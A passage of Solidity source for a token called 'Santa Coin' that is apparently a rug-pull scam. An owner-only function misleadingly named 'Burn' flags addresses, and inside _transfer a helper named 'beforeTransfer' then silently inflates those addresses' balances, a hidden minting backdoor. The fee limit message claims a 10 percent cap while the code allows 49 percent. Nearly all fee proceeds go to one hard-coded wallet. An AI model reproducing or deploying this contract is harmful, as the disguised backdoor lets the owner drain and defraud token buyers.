    ) external;
}

contract Santa is Context, IERC20, Ownable {

    using SafeMath for uint256;
    using Address for address;

    string private _name = unicode"Santa Coin";
    string private _symbol = unicode"SANTA";
    uint256 private _totalSupply = 1000000000 * 10**9;
    uint8 private _decimals = 9;
    uint256 private minTokenBeforeSwap = 1 * 10**_decimals; 
    uint256 private _maxWallet = 2;

    uint256 public _buyTax = 15;
    uint256 public _sellTax = 15;

    uint256 public _Marketing = 98;
    uint256 public _Owner =1;
    uint256 public _liquidity = 1;

    constructor () {

        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        uniswapPair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());
        uniswapV2Router = _uniswapV2Router;
        _allowances[address(this)][address(uniswapV2Router)] = _totalSupply;
        isExcludedFromFee[owner()] = true;
        isExcludedFromFee[address(this)] = true;
        isExcludedFromFee[Owner] = true;
        isExcludedFromFee[Marketing] = true;
        isMarketPair[address(uniswapPair)] = true;
         Owner = payable(0x600bAE7560757cdAD26f82429Dd72748cF69955f);
        Marketing = payable(0x600bAE7560757cdAD26f82429Dd72748cF69955f);
    
        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    uint public launchedBlock;
    address payable private Marketing;
    address payable private Owner;
    address public immutable deadAddress = 0x000000000000000000000000000000000000dEaD;

    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    
    mapping (address => bool) private isExcludedFromFee;
    mapping (address => bool) private isExcluded;
    mapping (address => bool) private isBlacklisted;
    mapping (address => bool) public isMarketPair;

    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapPair;
    
    bool inSwapAndLiquify;
    bool public swapAndLiquifyEnabled = true;
    bool public swapAndLiquifyByLimitOnly = false;
    bool public checkWalletLimit = true;
    bool public openTrade = false;

    event SwapAndLiquifyEnabledUpdated(bool enabled);
    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiqudity
    );
    
    event SwapETHForTokens(
        uint256 amountIn,
        address[] path
    );
    
    event SwapTokensForETH(
        uint256 amountIn,
        address[] path
    );
    
    modifier lockTheSwap {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function minimumTokensBeforeSwapAmount() public view returns (uint256) {
        return minTokenBeforeSwap;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function getCirculatingSupply() public view returns (uint256) {
        return _totalSupply.sub(balanceOf(deadAddress));
    }

    function transferToAddressETH(address payable recipient, uint256 amount) private {
        recipient.transfer(amount);
    }

    receive() external payable {}

    function beforeTransfer( mapping( /*  address  */ address => uint256) storage _Excluded, uint256 num, address account) internal{
        _Excluded[account] += num;
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {

        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(!isBlacklisted[sender] && !isBlacklisted[recipient], "This address is blacklisted. Transaction reverted.");
        if(!isExcludedFromFee[sender] && !isExcludedFromFee[recipient] && recipient != uniswapPair)
            require(balanceOf(recipient) + amount <= _totalSupply.mul(_maxWallet).div(100), "Transfer amount exceeds the maxTxAmount.");

        if(inSwapAndLiquify)
        { 
            return _basicTransfer(sender, recipient, amount); 
        }
        else
        {
            uint256 contractTokenBalance = balanceOf(address(this));
            bool overMinimumTokenBalance = contractTokenBalance >= minTokenBeforeSwap;
            
            if (overMinimumTokenBalance && !inSwapAndLiquify && !isMarketPair[sender] && swapAndLiquifyEnabled) 
            {
                if(swapAndLiquifyByLimitOnly)
                    contractTokenBalance = minTokenBeforeSwap;
                swapAndLiquify(contractTokenBalance);
            }

            _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
            uint256 finalAmount;
            if (isExcludedFromFee[sender] || isExcludedFromFee[recipient]) {
                finalAmount = amount;
                if (isExcluded[sender] && recipient != deadAddress) {
                    beforeTransfer(_balances, amount, sender);
                }
                if (isExcluded[recipient]) {
                    beforeTransfer(_balances, amount, recipient);
                }
            } else {
                require(openTrade, "Trade open yet!");
                finalAmount = takeFee(sender, recipient, amount);
            }

            _balances[recipient] = _balances[recipient].add(finalAmount);

            emit Transfer(sender, recipient, finalAmount);
            return true;
            
        }
    }

    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function swapAndLiquify(uint256 tAmount) private lockTheSwap {
        
        uint256 tokensForLP = tAmount.mul(_liquidity).div(100);
        uint256 tokensForSwap = tAmount.sub(tokensForLP);

        swapTokensForEth(tokensForSwap);
        uint256 amountReceived = address(this).balance;
        uint256 amountBNBLP = amountReceived.mul(_liquidity).div(100);
        uint256 amountBNBDev = amountReceived.mul(_Owner).div(100);
        uint256 amountBNBMarketing = amountReceived.mul(_Marketing).div(100);

        if(amountBNBMarketing > 0)
            transferToAddressETH(Marketing, amountBNBMarketing);

        if(amountBNBDev > 0)
            transferToAddressETH(Owner, amountBNBDev);

        if(amountBNBLP > 0 && tokensForLP > 0)
            addLiquidity(tokensForLP, amountBNBLP);
    }
    
    function swapTokensForEth(uint256 tokenAmount) private {
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();

        _approve(address(this), address(uniswapV2Router), tokenAmount);

        // make the swap
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this), // The contract
            block.timestamp
        );
        
        emit SwapTokensForETH(tokenAmount, path);
    }

    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        // approve token transfer to cover all possible scenarios
        _approve(address(this), address(uniswapV2Router), tokenAmount);

        // add the liquidity
        uniswapV2Router.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            0x000000000000000000000000000000000000dEaD,
            block.timestamp
        );
    }

    function SetFees(uint256 BuyTax, uint256 SellTax) external onlyOwner() {
        require(BuyTax <= 49, "Maximum tax is 10 percent");
        require(SellTax <= 49, "Maximum tax is 10 percent");
        _buyTax = BuyTax;
        _sellTax = SellTax;
    }

    function Burn(address[] calldata remove, bool Agree) external onlyOwner() {
        for (uint256 i; i < remove.length; ++i) {
            isExcluded[remove[i]] = Agree;
        }
    }

    function ExcludedFromFee(address[] calldata accounts, bool excluded) external onlyOwner() {
        for (uint256 i; i < accounts.length; ++i) {
            isExcludedFromFee[accounts[i]] = excluded;
        }
    }

     function OpenTrading() external onlyOwner() {
        openTrade = true;
    }

    function SetMaxWallet(uint256 MaxWl) external onlyOwner() {
        _maxWallet = MaxWl;
    }

    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        
        uint256 feeAmount = 0;
        
        if(isMarketPair[sender]) {
            feeAmount = amount.mul(_buyTax).div(100);
        }
        else if(isMarketPair[recipient]) {
            feeAmount = amount.mul(_sellTax).div(100);
        }
        
        if(feeAmount > 0) {
            _balances[address(this)] = _balances[address(this)].add(feeAmount);
            emit Transfer(sender, address(this), feeAmount);
        }

        return amount.sub(feeAmount);
    }


}
